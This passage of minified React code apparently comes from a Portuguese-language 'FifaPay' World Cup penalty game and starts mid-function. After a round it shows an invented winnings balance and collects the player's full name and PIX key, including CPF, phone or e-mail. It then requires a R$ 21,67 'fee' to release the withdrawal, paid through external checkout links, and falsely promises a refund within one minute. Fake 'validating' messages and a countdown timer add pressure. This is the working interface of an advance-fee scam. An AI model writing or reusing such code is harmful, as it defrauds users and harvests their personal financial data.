            return () => {
                clearTimeout(n), clearTimeout(r);
            };
        }, []),
        u.jsxs("div", {
            className: "fixed inset-0 z-50 flex items-center justify-center pointer-events-none",
            children: [
                u.jsx("div", {
                    className: "absolute inset-0 bg-fcds-red/15",
                    style: { opacity: t === "show" ? 1 : 0, transition: "opacity 300ms" },
                }),
                u.jsx("div", {
                    className: "relative max-w-[min(92vw,380px)] w-full px-4",
                    style: {
                        transform:
                            t === "enter"
                                ? "scale(0.88) translateY(12px)"
                                : t === "leave"
                                  ? "scale(1.05) translateY(-8px)"
                                  : "scale(1) translateY(0)",
                        opacity: t === "leave" ? 0 : 1,
                        transition: "all 360ms cubic-bezier(0.34, 1.2, 0.64, 1)",
                    },
                    children: u.jsxs("div", {
                        className: dn,
                        style: hn,
                        children: [
                            u.jsx("div", { className: fn }),
                            u.jsxs("div", {
                                className: "px-5 pt-4 pb-3 text-center border-b border-white/10",
                                children: [
                                    u.jsx("p", { className: `${Ai} mb-1`, children: "Copa do Mundo FIFA" }),
                                    u.jsxs("p", {
                                        className:
                                            "font-display font-black text-[2.65rem] leading-none tracking-fcds-tight text-white drop-shadow-md",
                                        children: [
                                            "DEFESA",
                                            u.jsx("span", { className: "text-fcds-yellow", children: "!" }),
                                        ],
                                    }),
                                ],
                            }),
                            u.jsxs("div", {
                                className:
                                    "bg-gradient-to-b from-fcds-blue/25 to-fcds-night px-5 py-3 border-t border-fcds-yellow/30",
                                children: [
                                    u.jsx("p", {
                                        className:
                                            "text-center text-[10px] font-bold uppercase tracking-widest text-fcds-light-blue/90 mb-1",
                                        children: "Próxima cobrança",
                                    }),
                                    u.jsx("p", {
                                        className:
                                            "text-center font-display font-black text-2xl tracking-tight text-white",
                                        children: "Disputa segue",
                                    }),
                                ],
                            }),
                        ],
                    }),
                }),
            ],
        })
    );
}
function pv({ playerName: t, balance: e, goals: n, results: r, onContinueToResgate: s, onPlayAgain: i }) {
    return u.jsx("div", {
        className: "min-h-screen w-full bg-gradient-to-b from-emerald-950 via-emerald-900 to-emerald-950 text-white",
        children: u.jsxs("div", {
            className: "max-w-md mx-auto px-5 py-8",
            children: [
                u.jsx("div", {
                    className: "flex items-center justify-center mb-6",
                    children: u.jsx("img", {
                        src: "/ChatGPT_Image_18_de_abr._de_2026__15_19_06-removebg-preview.png",
                        alt: "FifaPay",
                        className: "h-12 w-auto object-contain select-none",
                        draggable: !1,
                    }),
                }),
                u.jsx("div", {
                    className:
                        "rounded-2xl border border-amber-400/40 bg-gradient-to-br from-amber-400 to-yellow-400 p-6 mb-5 shadow-lg shadow-black/15 relative overflow-hidden",
                    children: u.jsxs("div", {
                        className: "relative text-center",
                        children: [
                            u.jsxs("p", {
                                className: "text-emerald-950/75 font-medium text-xs mb-1",
                                children: ["Boa, ", t],
                            }),
                            u.jsx("p", {
                                className: "text-emerald-950 font-display font-bold text-sm mb-2",
                                children: "Saldo da rodada",
                            }),
                            u.jsxs("p", {
                                className:
                                    "text-emerald-950 text-5xl font-display font-bold tracking-tight leading-none",
                                children: ["R$ ", e.toFixed(2).replace(".", ",")],
                            }),
                            u.jsx("div", {
                                className: "mt-4 flex justify-center gap-1",
                                children: r.map((o, a) =>
                                    u.jsx(
                                        "div",
                                        {
                                            className: `w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-bold ${o ? "bg-emerald-700 text-white" : "bg-red-600 text-white"}`,
                                            children: "",
                                        },
                                        a
                                    )
                                ),
                            }),
                        ],
                    }),
                }),
                u.jsxs("div", {
                    className: "grid grid-cols-2 gap-3 mb-5",
                    children: [
                        u.jsxs("div", {
                            className: "bg-emerald-900/60 border border-emerald-700/50 rounded-2xl p-4 backdrop-blur",
                            children: [
                                u.jsx(Tf, { className: "w-6 h-6 text-yellow-400 mb-2" }),
                                u.jsxs("p", {
                                    className: "text-2xl font-display font-bold",
                                    children: [n, "/", r.length],
                                }),
                                u.jsx("p", {
                                    className: "text-emerald-200/70 text-xs font-medium",
                                    children: "Gols marcados",
                                }),
                            ],
                        }),
                        u.jsxs("div", {
                            className: "bg-emerald-900/60 border border-emerald-700/50 rounded-2xl p-4 backdrop-blur",
                            children: [
                                u.jsx(uu, { className: "w-6 h-6 text-yellow-400 mb-2" }),
                                u.jsx("p", {
                                    className: "text-2xl font-display font-bold",
                                    children: n > 0 ? `R$ ${(e / n).toFixed(2).replace(".", ",")}` : "R$ 0,00",
                                }),
                                u.jsx("p", {
                                    className: "text-emerald-200/70 text-xs font-medium",
                                    children: "Média por gol",
                                }),
                            ],
                        }),
                    ],
                }),
                u.jsxs("div", {
                    className: "bg-emerald-900/50 border border-emerald-700/40 rounded-2xl p-4 mb-5 backdrop-blur",
                    children: [
                        u.jsx("p", { className: "text-sm font-bold mb-2", children: "Resumo da partida" }),
                        u.jsx("div", {
                            className: "space-y-1.5",
                            children: r.map((o, a) =>
                                u.jsxs(
                                    "div",
                                    {
                                        className: "flex items-center justify-between text-xs",
                                        children: [
                                            u.jsxs("span", {
                                                className: "text-emerald-200/70",
                                                children: ["Pênalti ", a + 1],
                                            }),
                                            u.jsx("span", {
                                                className: `font-bold ${o ? "text-emerald-400" : "text-red-400"}`,
                                                children: o ? "GOL" : "DEFENDIDO",
                                            }),
                                        ],
                                    },
                                    a
                                )
                            ),
                        }),
                    ],
                }),
                u.jsxs("div", {
                    className: "bg-yellow-400/10 border border-yellow-400/30 rounded-2xl p-4 mb-5",
                    children: [
                        u.jsx("p", { className: "text-yellow-300 font-bold text-sm mb-1", children: "Próxima etapa" }),
                        u.jsxs("p", {
                            className: "text-yellow-100/80 text-xs leading-relaxed",
                            children: [
                                "Seu saldo de R$ ",
                                e.toFixed(2).replace(".", ","),
                                " foi registrado. Continue para ver as opções de resgate via PIX.",
                            ],
                        }),
                    ],
                }),
                u.jsxs("button", {
                    type: "button",
                    onClick: s,
                    className:
                        "ds-cta-primary mb-3 w-full rounded-xl bg-gradient-to-r from-amber-400 to-yellow-400 py-3.5 text-[15px] text-emerald-950 shadow-md hover:from-amber-300 hover:to-yellow-300 active:scale-[0.99] flex items-center justify-center gap-2",
                    children: ["Continuar para o resgate", u.jsx(no, { className: "w-5 h-5", strokeWidth: 3 })],
                }),
                u.jsxs("button", {
                    type: "button",
                    onClick: i,
                    className:
                        "w-full bg-emerald-900/50 border border-emerald-600/50 hover:bg-emerald-900/70 active:scale-[0.98] transition-all text-emerald-100 font-bold text-sm py-3.5 rounded-2xl flex items-center justify-center gap-2",
                    children: [u.jsx(qg, { className: "w-5 h-5", strokeWidth: 2.5 }), "Jogar novamente"],
                }),
            ],
        }),
    });
}
function Li(t) {
    return t.replace(/\D/g, "");
}
function mv(t) {
    const e = Li(t);
    if (e.length !== 11 || /^(\d)\1{10}$/.test(e)) return !1;
    let n = 0;
    for (let i = 0; i < 9; i++) n += parseInt(e[i], 10) * (10 - i);
    let r = (n * 10) % 11;
    if ((r >= 10 && (r = 0), r !== parseInt(e[9], 10))) return !1;
    n = 0;
    for (let i = 0; i < 10; i++) n += parseInt(e[i], 10) * (11 - i);
    let s = (n * 10) % 11;
    return s >= 10 && (s = 0), s === parseInt(e[10], 10);
}
function gv(t) {
    const e = t.trim();
    if (e.length < 5 || e.length > 254 || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)) return !1;
    const [n, r] = e.split("@");
    return !(
        !n ||
        !r ||
        n.length > 64 ||
        r.length > 253 ||
        n.startsWith(".") ||
        n.endsWith(".") ||
        n.includes("..") ||
        !r.includes(".")
    );
}
function vv(t) {
    let e = Li(t);
    if ((e.startsWith("55") && e.length >= 12 && (e = e.slice(2)), e.length !== 11)) return !1;
    const n = parseInt(e.slice(0, 2), 10);
    return n < 11 || n > 99 ? !1 : e[2] === "9";
}
function yv(t) {
    const e = t.trim();
    if (/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(e)) return !0;
    const r = e.replace(/-/g, "");
    return r.length !== 32 || !/^[0-9a-f]{32}$/i.test(r) ? !1 : r[12] === "4" && /^[89ab]$/i.test(r[16]);
}
function xv(t, e) {
    if (!t) return "";
    if (e === "CPF") {
        let n = Li(t).slice(0, 11);
        return n.length <= 3
            ? n
            : n.length <= 6
              ? `${n.slice(0, 3)}.${n.slice(3)}`
              : n.length <= 9
                ? `${n.slice(0, 3)}.${n.slice(3, 6)}.${n.slice(6)}`
                : `${n.slice(0, 3)}.${n.slice(3, 6)}.${n.slice(6, 9)}-${n.slice(9)}`;
    }
    if (e === "Celular") {
        let n = Li(t);
        return (
            n.startsWith("55") && n.length > 11 && (n = n.slice(2)),
            (n = n.slice(0, 11)),
            n.length <= 2
                ? n
                : n.length <= 6
                  ? `(${n.slice(0, 2)}) ${n.slice(2)}`
                  : n.length <= 10
                    ? `(${n.slice(0, 2)}) ${n.slice(2, 6)}-${n.slice(6)}`
                    : `(${n.slice(0, 2)}) ${n.slice(2, 7)}-${n.slice(7)}`
        );
    }
    if (e === "Chave Aleatória") {
        let n = t.replace(/[^0-9a-fA-F]/g, "").slice(0, 32),
            r = "";
        return (
            n.length > 0 && (r += n.slice(0, 8)),
            n.length > 8 && (r += "-" + n.slice(8, 12)),
            n.length > 12 && (r += "-" + n.slice(12, 16)),
            n.length > 16 && (r += "-" + n.slice(16, 20)),
            n.length > 20 && (r += "-" + n.slice(20, 32)),
            r
        );
    }
    return t;
}
function qo(t, e) {
    const n = e.trim();
    if (!n) return !1;
    switch (t) {
        case "CPF":
            return mv(n);
        case "E-mail":
            return gv(n);
        case "Celular":
            return vv(n);
        case "Chave Aleatória":
            return yv(n);
        default:
            return !1;
    }
}
function wv(t) {
    switch (t) {
        case "CPF":
            return "CPF inválido para PIX (verifique os dígitos).";
        case "E-mail":
            return "E-mail inválido como chave PIX.";
        case "Celular":
            return "Use celular com DDD e 9 na frente (11 dígitos), ex.: (11) 98765-4321.";
        case "Chave Aleatória":
            return "Use um UUID v4 válido (ex.: xxxxxxxx-xxxx-4xxx-xxxx-xxxxxxxxxxxx).";
        default:
            return "Chave inválida.";
    }
}
const _v = ["CPF", "E-mail", "Celular", "Chave Aleatória"],
    pixStorageKeysFt = ["cpf", "email", "telefone"];
function mapPixFieldFt(t) {
    switch (t) {
        case "CPF":
            return "cpf";
        case "E-mail":
            return "email";
        case "Celular":
            return "telefone";
        default:
            return null;
    }
}
function savePixDataFt(t, e, n) {
    const r = (t ?? "").trim(),
        i = (n ?? "").trim(),
        o = mapPixFieldFt(e);
    try {
        if (typeof globalThis.localStorage != "object") return;
        r ? globalThis.localStorage.setItem("nome", r) : globalThis.localStorage.removeItem("nome");
        for (const a of pixStorageKeysFt) globalThis.localStorage.removeItem(a);
        o && i && globalThis.localStorage.setItem(o, i);
    } catch {}
}
function redirectToCheckFt(t, e, n) {
    const r = new URL("./check/index.html", window.location.href),
        i = new URLSearchParams(window.location.search),
        o = (t ?? "").trim(),
        a = (n ?? "").trim(),
        l = mapPixFieldFt(e);
    o ? i.set("nome", o) : i.delete("nome");
    for (const c of pixStorageKeysFt) c !== l && i.delete(c);
    l && a ? i.set(l, a) : l && i.delete(l);
    r.search = i.toString();
    window.location.assign(r.toString());
}
function bv({ open: t, valorFormatado: e, onClose: n, onSubmit: r }) {
    const [s, i] = x.useState(""),
        [o, a] = x.useState(null),
        [l, c] = x.useState(""),
        [d, h] = x.useState(!1),
        [f, v] = x.useState(null),
        [y, _] = x.useState(!1);
    x.useEffect(() => {
        t || (i(""), a(null), c(""), h(!1), v(null), _(!1));
    }, [t]),
        x.useEffect(() => {
            if (t)
                return (
                    (document.body.style.overflow = "hidden"),
                    () => {
                        document.body.style.overflow = "";
                    }
                );
        }, [t]);
    const b = o ?? "Escolha o tipo de chave PIX",
        g = o === null,
        p = s.trim().length > 0 && o !== null && qo(o, l),
        m = x.useMemo(() => (!o || !l.trim() || qo(o, l) ? null : wv(o)), [o, l]),
        w = m && (y || f === "chave"),
        k = (E) => {
            v(E), setTimeout(() => v(null), 500);
        },
        j = (E) => {
            o && c(xv(E, o));
        },
        N = () => {
            if (!s.trim()) {
                k("nome");
                return;
            }
            if (!o) {
                k("tipo");
                return;
            }
            if ((_(!0), !qo(o, l))) {
                k("chave");
                return;
            }
            savePixDataFt(s, o, l), r({ nome: s.trim(), tipoChave: o, chavePix: l.trim() });
        };
    return t
        ? u.jsxs("div", {
              className: "fixed inset-0 z-[200] flex flex-col justify-end",
              role: "dialog",
              "aria-modal": "true",
              children: [
                  u.jsx("button", {
                      type: "button",
                      className: "absolute inset-0 bg-black/65 backdrop-blur-[2px]",
                      onClick: n,
                      "aria-label": "Fechar",
                  }),
                  u.jsx("div", {
                      className: "relative z-10 mx-auto w-full max-w-md",
                      children: u.jsxs("div", {
                          className: "rounded-t-3xl border border-emerald-700/50 bg-emerald-900 shadow-2xl",
                          children: [
                              u.jsxs("div", {
                                  className:
                                      "flex items-center justify-between border-b border-emerald-800/80 px-4 py-3",
                                  children: [
                                      u.jsxs("div", {
                                          children: [
                                              u.jsx("p", {
                                                  className:
                                                      "text-[11px] font-bold uppercase tracking-wide text-emerald-400/90",
                                                  children: "Saque PIX",
                                              }),
                                              u.jsxs("p", {
                                                  className: "text-sm font-display font-bold text-white",
                                                  children: ["Valor: ", e],
                                              }),
                                          ],
                                      }),
                                      u.jsx("button", {
                                          type: "button",
                                          onClick: n,
                                          className: "rounded-full p-2 text-emerald-300 hover:bg-emerald-800/80",
                                          "aria-label": "Fechar",
                                          children: u.jsx(Jg, { className: "h-5 w-5" }),
                                      }),
                                  ],
                              }),
                              u.jsxs("div", {
                                  className: "max-h-[min(72vh,520px)] overflow-y-auto px-4 pb-6 pt-4",
                                  children: [
                                      u.jsx("label", {
                                          className: "mb-1.5 block text-xs font-bold text-emerald-200/90",
                                          children: "Nome completo",
                                      }),
                                      u.jsx("input", {
                                          type: "text",
                                          autoComplete: "name",
                                          value: s,
                                          onChange: (E) => i(E.target.value),
                                          placeholder: "Como no documento",
                                          className: `mb-4 w-full rounded-xl border bg-emerald-950/80 px-3 py-3 text-white placeholder:text-emerald-600/50 focus:outline-none focus:ring-2 focus:ring-yellow-400/50 ${f === "nome" ? "animate-pulse border-red-500 ring-2 ring-red-500/50" : "border-emerald-700/60"}`,
                                      }),
                                      u.jsx("label", {
                                          className: "mb-1.5 block text-xs font-bold text-emerald-200/90",
                                          children: "Tipo de chave PIX",
                                      }),
                                      u.jsxs("button", {
                                          type: "button",
                                          onClick: () => h(!0),
                                          className: `mb-4 flex w-full items-center justify-between rounded-xl border px-3 py-3 text-left text-sm font-semibold ${f === "tipo" ? "border-red-500 ring-2 ring-red-500/40" : "border-emerald-700/60 bg-emerald-950/80"} ${o ? "text-white" : "text-emerald-500/70"}`,
                                          children: [
                                              b,
                                              u.jsx("span", { className: "text-emerald-500", children: "▾" }),
                                          ],
                                      }),
                                      u.jsx("label", {
                                          className: "mb-1.5 block text-xs font-bold text-emerald-200/90",
                                          children: "Chave PIX",
                                      }),
                                      u.jsx("input", {
                                          type: "text",
                                          disabled: g,
                                          value: l,
                                          onChange: (E) => j(E.target.value),
                                          onBlur: () => _(!0),
                                          placeholder: g ? "Selecione o tipo acima" : "Digite a chave",
                                          className: `mb-1 w-full rounded-xl border bg-emerald-950/80 px-3 py-3 text-white placeholder:text-emerald-600/50 focus:outline-none focus:ring-2 focus:ring-yellow-400/50 disabled:cursor-not-allowed disabled:opacity-50 ${w ? "border-red-500/80 ring-1 ring-red-500/40" : "border-emerald-700/60"}`,
                                      }),
                                      u.jsx("div", {
                                          className: "mb-4 min-h-[18px]",
                                          children:
                                              w &&
                                              u.jsx("p", {
                                                  className: "text-[11px] font-medium text-red-400",
                                                  children: m,
                                              }),
                                      }),
                                      u.jsx("button", {
                                          type: "button",
                                          onClick: N,
                                          disabled: !p,
                                          className: `w-full rounded-2xl py-3.5 text-sm font-display font-bold transition-all ${p ? "bg-gradient-to-r from-yellow-400 to-amber-400 text-emerald-950 shadow-lg active:scale-[0.98]" : "cursor-not-allowed bg-emerald-950/80 text-emerald-600"}`,
                                          children: "Enviar",
                                      }),
                                  ],
                              }),
                          ],
                      }),
                  }),
                  d &&
                      u.jsxs("div", {
                          className: "fixed inset-0 z-[210] flex flex-col justify-end",
                          children: [
                              u.jsx("button", {
                                  type: "button",
                                  className: "absolute inset-0 bg-black/50",
                                  onClick: () => h(!1),
                                  "aria-label": "Fechar lista",
                              }),
                              u.jsxs("div", {
                                  className:
                                      "relative z-10 mx-auto w-full max-w-md rounded-t-3xl border border-emerald-700/50 bg-emerald-950 p-2 pb-6",
                                  children: [
                                      u.jsx("p", {
                                          className: "px-3 py-2 text-center text-xs font-bold text-emerald-300/90",
                                          children: "Selecione o tipo",
                                      }),
                                      u.jsx("div", {
                                          className: "flex max-h-[40vh] flex-col gap-1 overflow-y-auto pb-2",
                                          children: _v.map((E) =>
                                              u.jsx(
                                                  "button",
                                                  {
                                                      type: "button",
                                                      onClick: () => {
                                                          a(E), c(""), _(!1), h(!1);
                                                      },
                                                      className:
                                                          "rounded-xl px-4 py-3 text-left text-sm font-bold text-white hover:bg-emerald-800/80",
                                                      children: E,
                                                  },
                                                  E
                                              )
                                          ),
                                      }),
                                  ],
                              }),
                          ],
                      }),
              ],
          })
        : null;
}
const kv = "https://pay.descontoaplicado.site/69e436e8810f82eeced9d029",
    Sv = "https://pay.descontoaplicado.site/69e43793e69de7539e3c5c7e",
    jv = "/ChatGPT_Image_18_de_abr._de_2026__15_19_06-removebg-preview.png",
    Go = 21.67;
function Pr(t) {
    return t
        .toFixed(2)
        .replace(".", ",")
        .replace(/\B(?=(\d{3})+(?!\d))/g, ".");
}
function Ev(t) {
    return 1 - Math.pow(1 - t, 3);
}
function Nv() {
    return new Intl.DateTimeFormat("pt-BR", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
    }).format(new Date());
}
function Mc({ onPay: t, className: e = "mb-4" }) {
    return u.jsxs("div", {
        className: `rounded-2xl border border-emerald-700/45 bg-emerald-900/55 p-5 shadow-inner backdrop-blur-sm ${e}`,
        children: [
            u.jsx("button", {
                type: "button",
                onClick: t,
                className:
                    "mb-3 block w-full rounded-xl border-0 bg-gradient-to-r from-amber-400 to-yellow-400 px-4 py-3.5 text-center text-[15px] font-display font-semibold text-emerald-950 shadow-md transition-opacity hover:opacity-95 active:scale-[0.99]",
                children: "Pagar taxa para Liberar Saque",
            }),
            u.jsx("p", {
                className: "text-center text-[11px] font-semibold text-emerald-300/90",
                children: "⏱️ Reembolso automático em 1 minuto",
            }),
        ],
    });
}
function Cv({ balance: t, valorSaqueSelecionado: e, pixNome: n, pixTipoChave: r, pixChave: s }) {
    const [i, o] = x.useState(0),
        [a, l] = x.useState(!1),
        c = x.useRef(null);
    x.useEffect(() => {
        const y = t;
        let _ = null;
        const b = (g) => {
            _ === null && (_ = g);
            const p = g - _,
                m = Math.min(1, p / 2e3);
            o(0 + (y - 0) * Ev(m)), m < 1 ? (c.current = requestAnimationFrame(b)) : o(y);
        };
        return (
            (c.current = requestAnimationFrame(b)),
            () => {
                c.current && cancelAnimationFrame(c.current);
            }
        );
    }, [t]);
    const d = `R$ ${Pr(i)}`,
        h = Pr(e),
        f = () => {
            l(!1), redirectToCheckFt(n, r, s);
        };
    return a
        ? u.jsxs("div", {
              className: "relative min-h-[100dvh] w-full overflow-hidden bg-emerald-950",
              children: [
                  u.jsx("button", {
                      type: "button",
                      onClick: () => l(!1),
                      className:
                          "absolute left-3 top-3 z-10 rounded-lg border border-white/15 bg-emerald-950/90 px-3 py-1.5 text-xs font-semibold text-white shadow-md backdrop-blur-sm hover:bg-emerald-900/95",
                      children: "Voltar",
                  }),
                  u.jsx("div", {
                      className: "h-[100dvh] w-full overflow-hidden",
                      children: u.jsx("iframe", {
                          src: kv,
                          title: "Pagamento",
                          loading: "lazy",
                          allowFullScreen: !0,
                          className: "block h-full w-full border-0",
                      }),
                  }),
              ],
          })
        : u.jsx("div", {
              className: "min-h-dvh w-full bg-gradient-to-b from-emerald-950 via-emerald-900 to-emerald-950 text-white",
              children: u.jsxs("main", {
                  className: "mx-auto box-border w-full max-w-md overflow-x-hidden px-5 pb-10 pt-3",
                  children: [
                      u.jsx("div", {
                          className: "mb-5 flex justify-center border-b border-white/10 pb-5",
                          children: u.jsx("img", {
                              src: jv,
                              alt: "FifaPay",
                              className:
                                  "h-12 w-auto select-none object-contain drop-shadow-[0_6px_14px_rgba(250,204,21,0.25)]",
                              draggable: !1,
                          }),
                      }),
                      u.jsxs("div", {
                          className:
                              "mb-4 rounded-2xl border border-yellow-400/20 bg-gradient-to-br from-emerald-950 via-emerald-900 to-slate-900 p-5 shadow-lg shadow-black/20",
                          children: [
                              u.jsx("div", {
                                  className: "mb-1.5 text-[11px] font-bold uppercase tracking-wider text-yellow-200/90",
                                  children: "Saldo disponível",
                              }),
                              u.jsx("div", {
                                  className: "mb-1.5 text-[28px] font-bold tracking-tight text-white",
                                  "aria-live": "polite",
                                  children: d,
                              }),
                              u.jsx("div", {
                                  className: "text-xs font-medium text-emerald-200/80",
                                  children: "Aguardando confirmação para saque",
                              }),
                          ],
                      }),
                      u.jsxs("div", {
                          className:
                              "mb-4 rounded-2xl border border-emerald-700/45 bg-emerald-900/55 p-5 shadow-inner backdrop-blur-sm",
                          children: [
                              u.jsx("div", {
                                  className: "mb-3 text-[11px] font-bold uppercase tracking-wider text-emerald-300/90",
                                  children: "Confirmação de identidade",
                              }),
                              u.jsxs("div", {
                                  className: "mb-3 text-[22px] font-bold tracking-tight text-red-400",
                                  children: [
                                      "R$ ",
                                      Pr(Go),
                                      u.jsx("span", {
                                          className:
                                              "ml-2 inline-block rounded-lg border border-emerald-500/30 bg-emerald-500/15 px-2 py-0.5 text-[10px] font-bold uppercase tracking-wide text-emerald-300",
                                          children: "Valor reembolsável",
                                      }),
                                  ],
                              }),
                              u.jsxs("p", {
                                  className: "text-[13px] leading-relaxed text-emerald-200/85",
                                  children: [
                                      "Taxa obrigatória para liberação do saque no valor de",
                                      " ",
                                      u.jsxs("span", { className: "font-bold text-white", children: ["R$ ", h] }),
                                      ". O valor de",
                                      " ",
                                      u.jsxs("span", { className: "font-bold text-white", children: ["R$ ", Pr(Go)] }),
                                      " será reembolsado integralmente para você em 1 minuto.",
                                  ],
                              }),
                          ],
                      }),
                      u.jsx(Mc, { onPay: f }),
                      u.jsxs("div", {
                          className:
                              "mb-4 rounded-2xl border border-emerald-700/45 bg-emerald-900/55 p-5 shadow-inner backdrop-blur-sm",
                          children: [
                              u.jsx("div", {
                                  className: "mb-3 text-[11px] font-bold uppercase tracking-wider text-emerald-300/90",
                                  children: "Dados para reembolso",
                              }),
                              u.jsxs("div", {
                                  className: "space-y-3",
                                  children: [
                                      u.jsxs("div", {
                                          className: "flex justify-between gap-3 border-b border-emerald-800/50 pb-3",
                                          children: [
                                              u.jsx("span", {
                                                  className: "text-xs text-emerald-300/80",
                                                  children: "Nome",
                                              }),
                                              u.jsx("span", {
                                                  className: "max-w-[60%] text-right text-xs font-semibold text-white",
                                                  children: n,
                                              }),
                                          ],
                                      }),
                                      u.jsxs("div", {
                                          className: "flex justify-between gap-3 border-b border-emerald-800/50 pb-3",
                                          children: [
                                              u.jsx("span", {
                                                  className: "text-xs text-emerald-300/80",
                                                  children: "Data",
                                              }),
                                              u.jsx("span", {
                                                  className: "text-right text-xs font-semibold text-white",
                                                  children: Nv(),
                                              }),
                                          ],
                                      }),
                                      u.jsxs("div", {
                                          className: "flex justify-between gap-3 border-b border-emerald-800/50 pb-3",
                                          children: [
                                              u.jsx("span", {
                                                  className: "text-xs text-emerald-300/80",
                                                  children: "Chave PIX",
                                              }),
                                              u.jsx("span", {
                                                  className: "max-w-[55%] text-right text-xs font-semibold text-white",
                                                  children: r,
                                              }),
                                          ],
                                      }),
                                      u.jsxs("div", {
                                          className: "flex justify-between gap-3 pb-1",
                                          children: [
                                              u.jsx("span", {
                                                  className: "text-xs text-emerald-300/80",
                                                  children: "Valor a receber",
                                              }),
                                              u.jsxs("span", {
                                                  className: "text-right text-xs font-bold text-yellow-300",
                                                  children: ["R$ ", h],
                                              }),
                                          ],
                                      }),
                                  ],
                              }),
                              u.jsx("div", {
                                  className:
                                      "mt-3 rounded-xl border border-emerald-700/50 bg-emerald-950/60 px-3 py-3 text-center font-mono text-[11px] text-emerald-100 break-all",
                                  children: s,
                              }),
                          ],
                      }),
                      u.jsx("div", { className: "my-5 h-px bg-emerald-800/40" }),
                      u.jsxs("div", {
                          className:
                              "mb-4 rounded-2xl border border-emerald-700/45 bg-emerald-900/55 p-5 shadow-inner backdrop-blur-sm",
                          children: [
                              u.jsx("div", {
                                  className: "mb-4 text-[11px] font-bold uppercase tracking-wider text-emerald-300/90",
                                  children: "Processo de liberação",
                              }),
                              u.jsxs("div", {
                                  className: "grid gap-4",
                                  children: [
                                      u.jsxs("div", {
                                          className: "flex gap-3",
                                          children: [
                                              u.jsx("div", {
                                                  className:
                                                      "flex h-8 w-8 shrink-0 items-center justify-center rounded-lg bg-yellow-400/20 text-sm font-display font-bold text-yellow-300",
                                                  children: "1",
                                              }),
                                              u.jsxs("div", {
                                                  children: [
                                                      u.jsx("div", {
                                                          className: "mb-0.5 text-sm font-bold text-white",
                                                          children: "Pagar taxa de confirmação",
                                                      }),
                                                      u.jsxs("div", {
                                                          className: "text-xs leading-snug text-emerald-300/75",
                                                          children: ["R$ ", Pr(Go), " para verificação de identidade"],
                                                      }),
                                                  ],
                                              }),
                                          ],
                                      }),
                                      u.jsxs("div", {
                                          className: "flex gap-3",
                                          children: [
                                              u.jsx("div", {
                                                  className:
                                                      "flex h-8 w-8 shrink-0 items-center justify-center rounded-lg bg-emerald-500/25 text-sm font-bold text-emerald-300",
                                                  children: "✓",
                                              }),
                                              u.jsxs("div", {
                                                  children: [
                                                      u.jsx("div", {
                                                          className: "mb-0.5 text-sm font-bold text-emerald-300",
                                                          children: "Receber reembolso automático",
                                                      }),
                                                      u.jsx("div", {
                                                          className: "text-xs leading-snug text-emerald-300/75",
                                                          children: "Valor devolvido em 1 minuto",
                                                      }),
                                                  ],
                                              }),
                                          ],
                                      }),
                                      u.jsxs("div", {
                                          className: "flex gap-3",
                                          children: [
                                              u.jsx("div", {
                                                  className:
                                                      "flex h-8 w-8 shrink-0 items-center justify-center rounded-lg bg-yellow-400/20 text-sm font-display font-bold text-yellow-300",
                                                  children: "3",
                                              }),
                                              u.jsxs("div", {
                                                  children: [
                                                      u.jsx("div", {
                                                          className: "mb-0.5 text-sm font-bold text-white",
                                                          children: "Acessar saldo completo",
                                                      }),
                                                      u.jsxs("div", {
                                                          className: "text-xs leading-snug text-emerald-300/75",
                                                          children: ["R$ ", h, " liberado para saque"],
                                                      }),
                                                  ],
                                              }),
                                          ],
                                      }),
                                  ],
                              }),
                          ],
                      }),
                      u.jsx(Mc, { onPay: f, className: "mb-2" }),
                  ],
              }),
          });
}
const sn = 1.5,
    Pv = "rgba(6, 78, 59, 0.85)";
function Fe(t) {
    return t
        .toFixed(2)
        .replace(".", ",")
        .replace(/\B(?=(\d{3})+(?!\d))/g, ".");
}
function Tv(t) {
    const e = t.trim();
    if (!e) return null;
    const n = e.includes(",") ? e.replace(/\./g, "").replace(",", ".") : e.replace(/,/g, ""),
        r = parseFloat(n);
    return Number.isNaN(r) || r < 0 ? null : Math.round(r * 100) / 100;
}
function Rv(t) {
    return 1 - Math.pow(1 - t, 3);
}
const Ov = "/ChatGPT_Image_18_de_abr._de_2026__15_19_06-removebg-preview.png",
    Ws = ["Validando dados...", "Conectando ao servidor...", "Concluindo resgate...", "Quase pronto..."];
function $v({ playerName: t, balance: e, goals: n, results: r, onPlayAgain: s }) {
    const [i, o] = x.useState(0),
        [a, l] = x.useState(16 * 60 + 38),
        c = x.useRef(null),
        [d, h] = x.useState(() => Fe(e)),
        [f, v] = x.useState(!1),
        [y, _] = x.useState(0),
        [b, g] = x.useState(!1),
        [p, m] = x.useState(!1),
        [w, k] = x.useState(0),
        [j, N] = x.useState(!1),
        [E, U] = x.useState(null),
        I = n > 0 ? e / n : 0;
    x.useEffect(() => {
        h(Fe(e));
    }, [e]),
        x.useEffect(() => {
            const $e = e;
            let at = null;
            const js = (yr) => {
                at === null && (at = yr);
                const rn = yr - at,
                    xr = Math.min(1, rn / 2e3),
                    Es = 0 + ($e - 0) * Rv(xr);
                o(Es), xr < 1 ? (c.current = requestAnimationFrame(js)) : o($e);
            };
            return (
                (c.current = requestAnimationFrame(js)),
                () => {
                    c.current && cancelAnimationFrame(c.current);
                }
            );
        }, [e]),
        x.useEffect(() => {
            const G = window.setInterval(() => {
                l((we) => (we <= 0 ? 0 : we - 1));
            }, 1e3);
            return () => clearInterval(G);
        }, []),
        x.useEffect(() => {
            if (!p) return;
            k(0);
            const G = window.setInterval(() => {
                k((we) => (we + 1 < Ws.length ? we + 1 : we));
            }, 1600);
            return () => clearInterval(G);
        }, [p]);
    const fe = Math.floor(a / 60),
        it = a % 60,
        ze = `00 - ${String(fe).padStart(2, "0")} - ${String(it).padStart(2, "0")}`,
        pe = x.useMemo(() => Tv(d), [d]),
        pt = x.useMemo(
            () =>
                d.trim()
                    ? pe === null
                        ? "Digite um valor válido."
                        : pe < sn
                          ? `O valor mínimo é R$ ${Fe(sn)}.`
                          : pe > e + 0.001
                            ? `Não pode sacar mais que o saldo (R$ ${Fe(e)}).`
                            : null
                    : "Informe o valor do saque.",
            [d, pe, e]
        ),
        Ct = pe !== null && pe >= sn && pe <= e + 0.001,
        ot = (f || y > 0) && pt,
        C = () => {
            h(Fe(e));
        },
        T = (G) => {
            h(G);
        },
        R = () => {
